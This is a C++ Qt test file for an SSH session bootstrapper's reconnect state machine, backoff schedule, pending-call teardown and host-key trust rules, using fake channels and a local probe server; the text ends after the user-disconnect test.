// SessionBootstrap's connection-state machine and reconnect ladder (SPEC 5.6).
//
// The point of this gate is the path no live test can drive on demand: the
// remote session DYING. A live fixture can be wired and torn down, but it
// cannot be made to drop a channel at a chosen instant, ten times, on a
// millisecond budget. So the two side-effecting steps of a wire attempt —
// connectPool() and openChannelDevice() — are overridden here, and everything
// above them (state transitions, teardown ordering, backoff scheduling, the
// attempt cap) is the production code under test.
//
// The fake channel is a real SshChannelDevice subclass, not a QBuffer: the
// device type is part of SessionBootstrap's API (rpcDevice()) and its
// closeChannel() -> readChannelFinished() behaviour is exactly the mechanism
// that makes CodeharbordClient fail its pending calls.

#include "AgentStatusMonitor.h"
#include "CodeharbordClient.h"
#include "SessionBootstrap.h"
#include "SshChannelDevice.h"
#include "SshConnectionPool.h"

#include <QCoreApplication>
#include <QDir>
#include <QElapsedTimer>
#include <QFile>
#include <QFileInfo>
#include <QHostAddress>
#include <QList>
#include <QPointer>
#include <QProcess>
#include <QStandardPaths>
#include <QScopeGuard>
#include <QSignalSpy>
#include <QStringList>
#include <QTcpServer>
#include <QTcpSocket>
#include <QTemporaryDir>
#include <QTest>
#include <QTimer>

#include <functional>
#include <optional>
#include <utility>

using ch::AgentStatusMonitor;
using ch::CodeharbordClient;
using ch::RpcError;
using ch::SessionBootstrap;
using ch::SshChannelDevice;
using ch::SshConnectionPool;

using State = SessionBootstrap::State;

namespace {

// 1 s of backoff becomes 1 ms, so the full ten-attempt ladder
// (1+2+5+10+30+60*5 = 348 s) runs in 348 ms. The SCHEDULE is asserted in
// unscaled seconds through reconnectScheduled(), so the compression never
// weakens what is checked.
constexpr double kTimeScale = 0.001;

// An SshChannelDevice with no SSH under it: open, writable, and droppable on
// command. writeData() must succeed or CodeharbordClient::call() refuses to
// register a pending callback, and the pending-call teardown is one of the
// things being proven here.
class FakeChannel : public SshChannelDevice {
public:
    explicit FakeChannel(QObject* parent)
        : SshChannelDevice(nullptr, parent)
    {
        QIODevice::open(QIODevice::ReadWrite | QIODevice::Unbuffered);
    }

    // What a dead remote looks like to the device: EOF on the read channel,
    // emitted exactly as SshChannelDevice::pump() emits it.
    void dropRemote() { emit readChannelFinished(); }

    // What ordinary remote chatter looks like to the device: a line the peer
    // wrote to stderr. SshChannelDevice::pump() publishes stderr exactly this
    // way, and it is emphatically NOT a failure — codeharbor-bridge greets
    // every launch with one.
    void writeStderr(const QString& text) { emit channelError(text); }

    QByteArray written;

protected:
    qint64 writeData(const char* data, qint64 maxSize) override
    {
        written.append(data, maxSize);
        return maxSize;
    }
    qint64 readData(char*, qint64) override { return 0; }
};

// A local stand-in for an SSH endpoint, used by the cases that exercise the
// REAL probeEndpoint(). In its default mode it answers a new connection with an
// identification string, exactly as sshd does; muted, it accepts the connection
// and then says nothing forever — the "TCP is up but the SSH handshake never
// starts" hang that costs libssh a flat ten seconds.
class ProbeServer : public QTcpServer {
public:
    bool mute = false;
    int accepted = 0;

protected:
    void incomingConnection(qintptr descriptor) override
    {
        ++accepted;
        auto* peer = new QTcpSocket(this);
        peer->setSocketDescriptor(descriptor);
        if (mute)
            return;
        peer->write("SSH-2.0-probefixture\r\n");
        peer->flush();
    }
};

class TestBootstrap : public SessionBootstrap {
public:
    using SessionBootstrap::SessionBootstrap;

    bool connectOk = true;
    bool channelsOk = true;
    bool agentChannelOk = true;
    QString poolFailureMessage;
    SshConnectionPool* poolForError = nullptr;
    // The pre-flight is faked like the handshake is, EXCEPT where a case asks
    // for the production probe by setting realProbe (see the latency cases).
    bool probeOk = true;
    bool realProbe = false;
    int connectCalls = 0;
    int probeCalls = 0;
    QList<QPointer<FakeChannel>> channels;

    // Fired ONCE, from inside the very nested event loop the production
    // pre-flight is parked in, the next time a REAL probe starts.
    //
    // The only way to reach SessionBootstrap while an attempt is genuinely
    // stalled in probeEndpoint(). A wall-clock QTimer armed from the test body
    // cannot do it for a RETRY: the test is itself blocked inside that nested
    // loop, so it never regains control to arm anything until the probe has
    // already run its whole budget out. Delivered via a zero-timer rather than
    // called directly so it runs as an event of that loop — i.e. exactly as a
    // user clicking "disconnect" mid-freeze would.
    std::function<void()> onProbeStarted;

    FakeChannel* rpcChannel() const
    {
        return static_cast<FakeChannel*>(rpcDevice());
    }

protected:
    bool connectPool(const QString&, quint16, const QString&,
                     const QString&) override
    {
        ++connectCalls;
        if (!connectOk && poolForError && !poolFailureMessage.isEmpty())
            emit poolForError->errorOccurred(poolFailureMessage);
        return connectOk;
    }

    bool probeEndpoint(const QString& host, quint16 port,
                       QString* error) override
    {
        ++probeCalls;
        if (realProbe) {
            if (onProbeStarted)
                QTimer::singleShot(0, this, std::exchange(onProbeStarted, {}));
            return SessionBootstrap::probeEndpoint(host, port, error);
        }
        if (probeOk)
            return true;
        if (error)
            *error = QStringLiteral("endpoint is dark");
        return false;
    }

    SshChannelDevice* openChannelDevice(const QString&, const QString& role) override
    {
        if (!channelsOk || (role == QStringLiteral("codeharbor-bridge")
                            && !agentChannelOk))
            return nullptr;
        auto* channel = new FakeChannel(this);
        channels.append(channel);
        return channel;
    }

public:
    // ---- provisioning (SessionBootstrap::ensureRemoteService) --------------
    //
    // Canned runRemoteScript() answers, consumed in order. There is no other
    // way to say "this server runs node 22 and has nothing installed" without
    // a fleet of servers, and the decision tree those answers drive is the
    // whole feature.
    //
    // Left EMPTY by default, and that matters: every case written before
    // provisioning existed then runs the PRODUCTION implementation, which fails
    // at once (this harness's pool never handshakes, so no channel opens) and
    // therefore exercises the fail-soft path — connect anyway. So those cases
    // keep asserting exactly what they asserted before.
    struct ScriptReply {
        bool ok = true;
        QString output;
        QString error;
    };
    QList<ScriptReply> scriptReplies;
    bool scriptsFaked = false;
    // Every script handed to runRemoteScript(), in order, so a case can assert
    // on the exact text that would have run on someone else's machine.
    QStringList scriptsRun;

    void fakeScript(bool ok, const QString& output,
                    const QString& error = QString())
    {
        scriptsFaked = true;
        scriptReplies.append(ScriptReply{ok, output, error});
    }

protected:
    bool runRemoteScript(const QString& script, int timeoutMs, QString* output,
                         QString* error) override
    {
        scriptsRun.append(script);
        if (!scriptsFaked) {
            return SessionBootstrap::runRemoteScript(script, timeoutMs, output,
                                                     error);
        }
        if (scriptReplies.isEmpty()) {
            // A case that armed fewer answers than the decision tree asked for
            // has a bug in the case, not in the product — say so rather than
            // silently taking a fail-soft branch.
            if (error)
                *error = QStringLiteral("tst: no canned remote answer left");
            return false;
        }
        const ScriptReply reply = scriptReplies.takeFirst();
        if (output)
            *output = reply.output;
        if (error)
            *error = reply.error;
        return reply.ok;
    }
};

// One self-contained set of collaborators per test case.
struct Harness {
    QTemporaryDir dir;
    SshConnectionPool pool;
    CodeharbordClient client;
    AgentStatusMonitor monitor;
    TestBootstrap boot{&pool, &client, &monitor};
    QString host = QStringLiteral("example.invalid");
    quint16 port = 2222;

    Harness()
    {
        boot.setKnownHostsPath(dir.filePath(QStringLiteral("known_hosts")));
        // The pool the seam reports a handshake diagnostic on, so a failed
        // connect can reproduce the real errorOccurred() -> withLastPoolError()
        // path without a live libssh handshake.
        boot.poolForError = &pool;
        boot.setReconnectTimeScale(kTimeScale);
        // No user interface in this gate, and connectPool() is a test seam that
        // never performs a real handshake — but attemptWire() refuses to connect
        // at all unless SOMETHING is prepared to decide about an unknown host
        // key (SPEC 12.1), so the opt-in has to be explicit here.
        boot.setTrustUnknownHostKeys(true);
    }

    bool wire()
    {
        return boot.connectAndWire(host, port, QStringLiteral("user"),
                                   QStringLiteral("/usr/bin/node"),
                                   QStringLiteral("/srv/codeharbor"));
    }

    bool wireFromEnvironment() { return boot.connectAndWireFromEnvironment(); }

    // Point the harness at a local socket and let the production pre-flight run
    // against it.
    void useRealProbeAgainst(quint16 localPort)
    {
        host = QStringLiteral("127.0.0.1");
        port = localPort;
        boot.realProbe = true;
    }
};

// A free TCP port nothing is listening on: bind one, note it, drop the server.
quint16 refusedPort()
{
    QTcpServer probe;
    probe.listen(QHostAddress::LocalHost, 0);
    const quint16 port = probe.serverPort();
    probe.close();
    return port;
}

// One prerequisite report exactly as remoteInspectScript() prints it. The
// defaults describe a healthy but EMPTY server: current node, nothing
// installed, curl and tar present.
QString inspectionReport(const QString& node = QStringLiteral("v24.16.0"),
                         const QString& entry = QString(),
                         const QString& marker = QString(),
                         const QString& fetch = QStringLiteral("curl"),
                         const QString& tar = QStringLiteral("yes"))
{
    return QStringLiteral("CH_NODE=%1\nCH_ENTRY=%2\nCH_MARKER=%3\n"
                          "CH_FETCH=%4\nCH_TAR=%5\n")
        .arg(node, entry, marker, fetch, tar);
}

QString artifactUrl()
{
    return QStringLiteral("https://example.invalid/v9/codeharbor-remote.tar.gz");
}

QString installedEntry()
{
    return QStringLiteral("/srv/codeharbor/dist/codeharbord.js");
}

// What a successful remoteProvisionScript() run prints: progress lines, then
// the "installed" verdict it only reaches after proving an entry point exists.
QString installLog()
{
    return QStringLiteral("codeharbor: preparing /srv/codeharbor\n"
                          "codeharbor: fetching %1\n"
                          "codeharbor: unpacking codeharbor-remote\n"
                          "codeharbor: installed %2\n")
        .arg(artifactUrl(), installedEntry());
}

QList<State> states(const QSignalSpy& spy)
{
    QList<State> out;
    out.reserve(spy.size());
    for (const QList<QVariant>& call : spy)
        out.append(call.at(0).value<State>());
    return out;
}

} // namespace

class TstSessionBootstrap : public QObject {
    Q_OBJECT
private slots:
    void wiresAndReportsState();
    void initialConnectFailureDoesNotRetry();
    void existingUnreadableKnownHostsFailsClosed();
    void unknownHostKeyIsNeverTrustedWithoutADecisionPolicy();
    void unattendedTrustDoesNotOutliveTheAttempt();
    void environmentTrustDoesNotLeakIntoAttendedConnect();
    void channelLossReconnectsAndRewires();
    void agentChannelLossAlsoReconnects();
    void pendingCallsFailWhenTheSessionDies();
    void poolLossReconnects();
    void backoffLadderMatchesSpec();
    void retryDelaySequenceAndCap();
    void reconnectDisabledNeverSchedules();
    void disablingMidLadderStopsIt();
    void disablingTheLadderClearsItsAttemptCounter();
    void userDisconnectDoesNotReconnect();
    void uncappedLadderKeepsRetryingAtSixty();

    // Which channel news is a FAILURE and which is chatter.
    void remoteStderrIsDiagnosticNotError();
    void genuineChannelSetupFailureStillErrors();
    void channelLossCarriesThatChannelsLastRemoteWords();

    // Connect-stall bound and GUI responsiveness (this round's hunt).
    void refusedEndpointFailsFastAndCleanly();
    void muteEndpointIsBoundedByConnectTimeout();
    void probeKeepsTheEventLoopRunning();
    void reentrantConnectDuringProbeIsRefused();
    void darkEndpointNeverReachesTheBlockingHandshake();
    void ladderPaysOneBudgetPerRung();
    void disconnectDuringProbeCutsTheWaitShort();
    void disablingReconnectDuringProbeStopsTheLadder();
    void disconnectMidBackoffStopsImmediately();
    void disablingReconnectDuringAUserConnectLeavesItAlone();

    // Remote command construction from attacker-influenced profile fields.
    void remoteCommandsQuoteHostileProfileFields();
    void remoteEntryPointsSupportBothReleaseAndCheckoutLayouts();

    // Provisioning a bare server on first connect.
    void anExistingInstallIsLeftAlone();
    void aBareServerIsProvisionedThenWired();
    void aStaleInstallOfOursIsReplaced();
    void anInstallWeDidNotMakeIsNeverOverwritten();
    void missingRemoteNodeFailsWithSomethingToActOn();
    void tooOldRemoteNodeBlocksProvisioningButNotAnExistingInstall();
    void noRemoteDownloadToolFailsWithSomethingToActOn();
    void aStagedTarballNeedsNoDownloadTool();
    void anInstallThatDidNotLandFailsLoudly();
    void anInspectionThatCannotRunStillConnects();
    void nodeVersionFloorMatchesTheRemotePackageEngine();
    void aBlankNodePathFallsBackToABareName();
    void theInstalledReleaseIsTiedToTheClientVersion();
    void provisioningStaysInsideTheChosenDirectory();
    void theReportIsReadBackFieldForField();
    void aRequestedUpgradeReplacesAnInstallWeDidNotMake();
    void aRequestedUpgradeRefusesASourceCheckoutAndKeepsUsingIt();
    void aRequestedUpgradeAppliesToOneAttemptOnly();
    void aRequestedUpgradeThatCannotInspectSaysSo();
    void anArmedUpgradeIsSpentOrWithdrawnNeverForgotten();
    // A failed UPDATE must cost the user nothing but the update: the
    // installation that was working before has to still be there, and this
    // session has to come up on it.
    void anUpdateBlockedByAPrerequisiteKeepsTheOldServiceUsable();
    void anInstallThatFailedFallsBackToWhatSurvivedOnTheServer();
    // The provisioning script itself, executed by a real POSIX sh against real
    // files: staging, the swap, and the rollback that keeps a failed update from
    // costing the user the service they had.
    void theProvisionScriptStagesTheArchiveAndRollsBackUnderARealShell();
};

// A cold wire walks Disconnected -> Connecting -> Wired exactly once and hands
// both transports over.
void TstSessionBootstrap::wiresAndReportsState()
{
    Harness h;
    QCOMPARE(h.boot.state(), State::Disconnected);
    QSignalSpy stateSpy(&h.boot, &SessionBootstrap::stateChanged);
    QSignalSpy wiredSpy(&h.boot, &SessionBootstrap::wired);

    QVERIFY(h.wire());

    QCOMPARE(states(stateSpy), (QList<State>{State::Connecting, State::Wired}));
    QCOMPARE(wiredSpy.size(), 1);
    QCOMPARE(h.boot.state(), State::Wired);
    QCOMPARE(h.boot.reconnectAttempt(), 0);
    QVERIFY(!h.boot.reconnectPending());
    QVERIFY(h.boot.rpcDevice() != nullptr);
    QVERIFY(h.boot.agentDevice() != nullptr);
    QCOMPARE(h.client.transport(),
             static_cast<QIODevice*>(h.boot.rpcDevice()));
    QCOMPARE(h.monitor.transport(),
             static_cast<QIODevice*>(h.boot.agentDevice()));
}

// A connect the user asked for and that never came up is reported to the
// caller, not retried behind its back: there is no session to survive yet.
void TstSessionBootstrap::initialConnectFailureDoesNotRetry()
{
    Harness h;
    h.boot.connectOk = false;
    QSignalSpy stateSpy(&h.boot, &SessionBootstrap::stateChanged);
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY(!h.wire());

    QCOMPARE(states(stateSpy), (QList<State>{State::Connecting, State::Failed}));
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY(errorSpy.at(0).at(0).toString().contains(QStringLiteral("failed")));
    QVERIFY(!h.boot.reconnectPending());
    QCOMPARE(h.boot.connectCalls, 1);

    // And it stays down: no timer was armed to change its mind.
    QTest::qWait(50);
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(h.boot.connectCalls, 1);
}

void TstSessionBootstrap::existingUnreadableKnownHostsFailsClosed()
{
    Harness h;
    const QString path = h.dir.filePath(QStringLiteral("known_hosts"));
    QVERIFY(QDir().mkpath(path));
    h.boot.setKnownHostsPath(path);
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY2(!h.wire(),
             "an existing unreadable trusted-host store was treated as empty");
    QCOMPARE(h.boot.connectCalls, 0);
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY(errorSpy.at(0).at(0).toString().contains(
        QStringLiteral("trusted-host store")));
}

// SPEC 12.1: an unknown host key is the USER's decision. A wire attempt that
// finds nobody able to make that decision — no host-key callback on the pool,
// and no explicit unattended opt-in — must refuse, not quietly install an
// accept-everything policy and trust whatever the server presents.
void TstSessionBootstrap::unknownHostKeyIsNeverTrustedWithoutADecisionPolicy()
{
    Harness h;
    // Undo the harness opt-in: this case is the ATTENDED production default.
    h.boot.setTrustUnknownHostKeys(false);
    QVERIFY(!h.pool.hostKeyCallback());
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY2(!h.wire(),
             "wired a session with nothing able to decide about an unknown "
             "host key");

    // Refused BEFORE any handshake, and no auto-accept policy was left behind on
    // the pool for the next caller to inherit.
    QCOMPARE(h.boot.connectCalls, 0);
    QVERIFY2(!h.pool.hostKeyCallback(),
             "an unconditional accept-the-key policy was installed anyway");
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY2(errorSpy.at(0).at(0).toString().contains(QStringLiteral("host key")),
             qPrintable(errorSpy.at(0).at(0).toString()));

    // The refusal is about having nobody to ask, not about the flag: an
    // installed policy — what AppController puts there before every connect —
    // is enough on its own.
    h.pool.setHostKeyCallback([](const QString&, const QString&,
                                 const QByteArray&, ch::KnownHosts::Verdict) {
        return SshConnectionPool::HostKeyDecision::Reject;
    });
    QVERIFY(h.wire());
    QCOMPARE(h.boot.connectCalls, 1);
}

// setTrustUnknownHostKeys() is worth exactly ONE attempt's worth of "there is
// nobody to ask". The pool it borrows is shared and outlives the attempt, so an
// accept-everything policy left installed on it would be a one-way door: every
// later attempt reads "a callback exists" as "somebody is deciding", skips the
// refusal above, and keeps trusting unknown keys blindly — even after the
// opt-in has been withdrawn. So the attempt puts the policy on and takes it
// straight back off, and leaves a policy it did not install alone.
void TstSessionBootstrap::unattendedTrustDoesNotOutliveTheAttempt()
{
    Harness h;  // opts in, and installs no host-key policy on the pool
    QVERIFY(!h.pool.hostKeyCallback());

    QVERIFY(h.wire());
    QVERIFY2(!h.pool.hostKeyCallback(),
             "the unattended accept-everything policy was left on the shared "
             "pool for the next caller to inherit");

    // Withdrawing the opt-in therefore really does restore the safe answer.
    h.boot.disconnectSession();
    h.boot.setTrustUnknownHostKeys(false);
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    QVERIFY2(!h.wire(), "an unknown host key was still trusted with the "
                        "unattended opt-in switched off");
    QCOMPARE(h.boot.connectCalls, 1);  // refused before the handshake, as before
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY2(errorSpy.at(0).at(0).toString().contains(QStringLiteral("host key")),
             qPrintable(errorSpy.at(0).at(0).toString()));

    // The caller's OWN policy is the one thing that must survive an attempt:
    // AppController installs it before every connect and expects it to still be
    // there for the retry that follows a fingerprint prompt.
    h.boot.setTrustUnknownHostKeys(true);
    h.pool.setHostKeyCallback([](const QString&, const QString&,
                                 const QByteArray&, ch::KnownHosts::Verdict) {
        return SshConnectionPool::HostKeyDecision::Reject;
    });
    QVERIFY(h.wire());

    QVERIFY2(static_cast<bool>(h.pool.hostKeyCallback()),
             "the attempt removed a host-key policy it did not install");
}

void TstSessionBootstrap::environmentTrustDoesNotLeakIntoAttendedConnect()
{
    const bool hadSsh = qEnvironmentVariableIsSet("CH_LIVE_SSH");
    const QByteArray oldSsh = qgetenv("CH_LIVE_SSH");
    const bool hadHost = qEnvironmentVariableIsSet("CH_LIVE_HOST");
    const QByteArray oldHost = qgetenv("CH_LIVE_HOST");
    const bool hadPort = qEnvironmentVariableIsSet("CH_LIVE_PORT");
    const QByteArray oldPort = qgetenv("CH_LIVE_PORT");
    const bool hadUser = qEnvironmentVariableIsSet("CH_LIVE_USER");
    const QByteArray oldUser = qgetenv("CH_LIVE_USER");
    const bool hadNode = qEnvironmentVariableIsSet("CH_LIVE_NODE");
    const QByteArray oldNode = qgetenv("CH_LIVE_NODE");
    const bool hadRepo = qEnvironmentVariableIsSet("CH_LIVE_REPO");
    const QByteArray oldRepo = qgetenv("CH_LIVE_REPO");
    const auto restore = qScopeGuard([&] {
        const auto putBack = [](const char* name, bool wasSet,
                                const QByteArray& value) {
            if (wasSet)
                qputenv(name, value);
            else
                qunsetenv(name);
        };
        putBack("CH_LIVE_SSH", hadSsh, oldSsh);
        putBack("CH_LIVE_HOST", hadHost, oldHost);
        putBack("CH_LIVE_PORT", hadPort, oldPort);
        putBack("CH_LIVE_USER", hadUser, oldUser);
        putBack("CH_LIVE_NODE", hadNode, oldNode);
        putBack("CH_LIVE_REPO", hadRepo, oldRepo);
    });
    qputenv("CH_LIVE_SSH", "1");
    qputenv("CH_LIVE_HOST", "example.invalid");
    qputenv("CH_LIVE_PORT", "2222");
    qputenv("CH_LIVE_USER", "user");
    qputenv("CH_LIVE_NODE", "/usr/bin/node");
    qputenv("CH_LIVE_REPO", "/srv/codeharbor");

    Harness h;
    h.boot.setTrustUnknownHostKeys(false);
    QVERIFY(h.wireFromEnvironment());
    QVERIFY(h.boot.trustUnknownHostKeys());
    h.boot.disconnectSession();
    QVERIFY(!h.boot.trustUnknownHostKeys());

    // An attended connect has no automatic trust decision and must refuse
    // before it reaches the test seam (or a real SSH handshake).
    QVERIFY(!h.wire());
    QCOMPARE(h.boot.connectCalls, 1);
}

// The load-bearing case: the RPC channel dies, both devices are dropped, a
// retry is armed on the first rung of the ladder, and the session comes back.
void TstSessionBootstrap::channelLossReconnectsAndRewires()
{
    Harness h;
    QVERIFY(h.wire());
    QPointer<FakeChannel> dead = h.boot.rpcChannel();
    QPointer<FakeChannel> deadAgent =
        static_cast<FakeChannel*>(h.boot.agentDevice());
    QStringList notifications;
    QObject::connect(&h.boot, &SessionBootstrap::stateChanged, &h.boot,
                     [&notifications] { notifications.append(QStringLiteral("state")); });
    QObject::connect(&h.boot, &SessionBootstrap::error, &h.boot,
                     [&notifications] { notifications.append(QStringLiteral("error")); });
    QSignalSpy stateSpy(&h.boot, &SessionBootstrap::stateChanged);
    QSignalSpy wiredSpy(&h.boot, &SessionBootstrap::wired);
    QSignalSpy scheduleSpy(&h.boot, &SessionBootstrap::reconnectScheduled);

    dead->dropRemote();

    // Torn down at once, both sides, and armed for the first retry.
    QCOMPARE(notifications, (QStringList{QStringLiteral("state"),
                                         QStringLiteral("error")}));
    QCOMPARE(h.boot.state(), State::Reconnecting);
    QVERIFY(h.client.transport() == nullptr);
    QVERIFY(h.monitor.transport() == nullptr);
    QVERIFY(h.boot.reconnectPending());
    QCOMPARE(h.boot.nextReconnectDelaySeconds(), 1);
    QCOMPARE(scheduleSpy.size(), 1);
    QCOMPARE(scheduleSpy.at(0).at(0).toInt(), 1);  // attempt 1
    QCOMPARE(scheduleSpy.at(0).at(1).toInt(), 1);  // after 1 s

    QTRY_COMPARE(h.boot.state(), State::Wired);
    QCOMPARE(states(stateSpy),
             (QList<State>{State::Reconnecting, State::Wired}));
    QCOMPARE(wiredSpy.size(), 1);
    QCOMPARE(h.boot.connectCalls, 2);
    QCOMPARE(h.boot.reconnectAttempt(), 0);
    QVERIFY(!h.boot.reconnectPending());

    // Fresh channels, and the consumers hold the new ones. Prove the old
    // channel was destroyed through QPointer rather than comparing a freed
    // address, which can be recycled by the allocator on another platform.
    QTRY_VERIFY(dead.isNull());
    QCOMPARE(h.client.transport(),
             static_cast<QIODevice*>(h.boot.rpcDevice()));
    QCOMPARE(h.monitor.transport(),
             static_cast<QIODevice*>(h.boot.agentDevice()));

    // The dropped devices are deleted, not leaked onto the parent.
    QTRY_VERIFY(deadAgent.isNull());
}

// The agent-status channel is the other half of the session; losing it means
// the remote side is gone too.
void TstSessionBootstrap::agentChannelLossAlsoReconnects()
{
    Harness h;
    QVERIFY(h.wire());
    auto* agent = static_cast<FakeChannel*>(h.boot.agentDevice());

    agent->dropRemote();

    QCOMPARE(h.boot.state(), State::Reconnecting);
    QTRY_COMPARE(h.boot.state(), State::Wired);
    QCOMPARE(h.boot.connectCalls, 2);
}

// CodeharbordClient fails its pending callbacks from onTransportClosed(), which
// only fires on transport EOF. SessionBootstrap must therefore close the RPC
// device BEFORE detaching it, or every in-flight call hangs forever.
void TstSessionBootstrap::pendingCallsFailWhenTheSessionDies()
{
    Harness h;
    QVERIFY(h.wire());

    std::optional<RpcError> failure;
    bool answered = false;
    h.client.call(QStringLiteral("workspace.getTree"), QJsonValue(),
                  [&](const QJsonValue&, std::optional<RpcError> err) {
                      answered = true;
                      failure = err;
                  });
    // The request really went out on the wire and is pending, not
    // short-circuited by call()'s own "cannot transmit" path.
    QVERIFY(h.boot.rpcChannel()->written.contains("workspace.getTree"));
    QVERIFY(!answered);

    h.boot.rpcChannel()->dropRemote();

    QVERIFY(answered);
    QVERIFY(failure.has_value());
    QCOMPARE(failure->message,
             QStringLiteral("transport closed with request pending"));

    // Same guarantee on a deliberate teardown, where nobody emits EOF for us:
    // unwire() must close the channel while it is still attached.
    QTRY_COMPARE(h.boot.state(), State::Wired);
    std::optional<RpcError> second;
    h.client.call(QStringLiteral("workspace.getTree"), QJsonValue(),
                  [&](const QJsonValue&, std::optional<RpcError> err) {
                      second = err;
                  });
    QVERIFY(!second.has_value());
    h.boot.disconnectSession();
    QVERIFY(second.has_value());
    QCOMPARE(second->message,
             QStringLiteral("transport closed with request pending"));
}

// A session-level fault (the pool itself going down) is a loss even if no
// channel reported EOF first.
void TstSessionBootstrap::poolLossReconnects()
{
    Harness h;
    QVERIFY(h.wire());

    emit h.pool.errorOccurred(QStringLiteral("Socket error: disconnected"));

    QCOMPARE(h.boot.state(), State::Reconnecting);
    QTRY_COMPARE(h.boot.state(), State::Wired);
    QCOMPARE(h.boot.connectCalls, 2);
}

// SPEC 5.6: the session-level reconnect backoff ladder. This test pins the
// exact vector so the schedule cannot silently drift from the spec.
void TstSessionBootstrap::backoffLadderMatchesSpec()
{
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(-1), 1);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(0), 1);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(1), 2);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(2), 5);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(3), 10);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(4), 30);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(5), 60);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(6), 60);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(100), 60);
}

// Every rung actually used by the scheduler, in order, and the cap that ends
// it: ten consecutive failures -> Failed, with the delay pinned at 60 s rather
// than growing without bound.
void TstSessionBootstrap::retryDelaySequenceAndCap()
{
    Harness h;
    QVERIFY(h.wire());
    QCOMPARE(h.boot.maxReconnectAttempts(),
             SessionBootstrap::kDefaultMaxReconnectAttempts);

    QList<int> attempts;
    QList<int> delays;
    connect(&h.boot, &SessionBootstrap::reconnectScheduled, this,
            [&](int attempt, int delaySeconds) {
                attempts.append(attempt);
                delays.append(delaySeconds);
            });
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    h.boot.connectOk = false;  // nothing will come back up
    h.boot.rpcChannel()->dropRemote();

    QTRY_COMPARE(h.boot.state(), State::Failed);

    // Printed so a test run shows the ladder it actually walked, not just that
    // it matched.
    qInfo() << "observed backoff seconds:" << delays << "attempts:" << attempts;
    QCOMPARE(delays, (QList<int>{1, 2, 5, 10, 30, 60, 60, 60, 60, 60}));
    QCOMPARE(attempts, (QList<int>{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}));
    QCOMPARE(h.boot.reconnectAttempt(), 10);
    QCOMPARE(h.boot.connectCalls, 11);  // the original wire plus ten retries
    QVERIFY(!h.boot.reconnectPending());
    QVERIFY(errorSpy.last().at(0).toString().contains(
        QStringLiteral("giving up")));

    // Terminal: nothing fires after the cap.
    QTest::qWait(100);
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(h.boot.connectCalls, 11);
}

// Reconnect turned off before the loss: the session is reported down and left
// down.
void TstSessionBootstrap::reconnectDisabledNeverSchedules()
{
    Harness h;
    h.boot.setReconnectEnabled(false);
    QVERIFY(!h.boot.reconnectEnabled());
    QVERIFY(h.wire());

    h.boot.rpcChannel()->dropRemote();

    QCOMPARE(h.boot.state(), State::Disconnected);
    QVERIFY(!h.boot.reconnectPending());
    QVERIFY(h.client.transport() == nullptr);
    QTest::qWait(50);
    QCOMPARE(h.boot.connectCalls, 1);
}

// Turned off with a retry already armed: the armed retry must be cancelled, not
// allowed one last shot.
void TstSessionBootstrap::disablingMidLadderStopsIt()
{
    Harness h;
    h.boot.connectOk = true;
    QVERIFY(h.wire());
    h.boot.connectOk = false;
    h.boot.rpcChannel()->dropRemote();
    QCOMPARE(h.boot.state(), State::Reconnecting);
    QVERIFY(h.boot.reconnectPending());

    h.boot.setReconnectEnabled(false);

    QVERIFY(!h.boot.reconnectPending());
    QCOMPARE(h.boot.state(), State::Disconnected);
    QTest::qWait(50);
    QCOMPARE(h.boot.connectCalls, 1);
    QCOMPARE(h.boot.state(), State::Disconnected);
}

// Switching the ladder off is a way OUT of the ladder, exactly like
// disconnectSession(), and it has to leave the same bookkeeping behind.
// reconnectAttempt() is public and is what a shell renders as "attempt N of M";
// leaving the rung the ladder stopped on behind State::Disconnected reports a
// retry sequence that is not running any more, and nothing ever clears it
// except a later connect or a later loss.
void TstSessionBootstrap::disablingTheLadderClearsItsAttemptCounter()
{
    Harness h;
    // Uncapped, so the ladder cannot reach State::Failed underneath the wait
    // below and turn this into a race with the attempt cap.
    h.boot.setMaxReconnectAttempts(0);
    QVERIFY(h.wire());

    h.boot.connectOk = false;
    h.boot.rpcChannel()->dropRemote();
    // Let several rungs burn so the counter is genuinely non-zero.
    QTRY_VERIFY(h.boot.reconnectAttempt() >= 3);
    QCOMPARE(h.boot.state(), State::Reconnecting);

    h.boot.setReconnectEnabled(false);

    QCOMPARE(h.boot.state(), State::Disconnected);
    QVERIFY(!h.boot.reconnectPending());
    QCOMPARE(h.boot.reconnectAttempt(), 0);
    QCOMPARE(h.boot.nextReconnectDelaySeconds(), 0);

    // ...and it really is over: nothing fires afterwards.
    const int calls = h.boot.connectCalls;
    QTest::qWait(100);
    QCOMPARE(h.boot.state(), State::Disconnected);
    QCOMPARE(h.boot.connectCalls, calls);
}

// The user closed the session. It must stay closed.
void TstSessionBootstrap::userDisconnectDoesNotReconnect()
{
    Harness h;
    QVERIFY(h.wire());
    QSignalSpy stateSpy(&h.boot, &SessionBootstrap::stateChanged);

    h.boot.disconnectSession();

    QCOMPARE(states(stateSpy), (QList<State>{State::Disconnected}));
    QVERIFY(!h.boot.reconnectPending());
    QVERIFY(h.client.transport() == nullptr);
    QVERIFY(h.monitor.transport() == nullptr);
    QVERIFY(h.boot.rpcDevice() == nullptr);
    QVERIFY(h.boot.agentDevice() == nullptr);
    QTest::qWait(50);
    QCOMPARE(h.boot.state(), State::Disconnected);
    QCOMPARE(h.boot.connectCalls, 1);
}

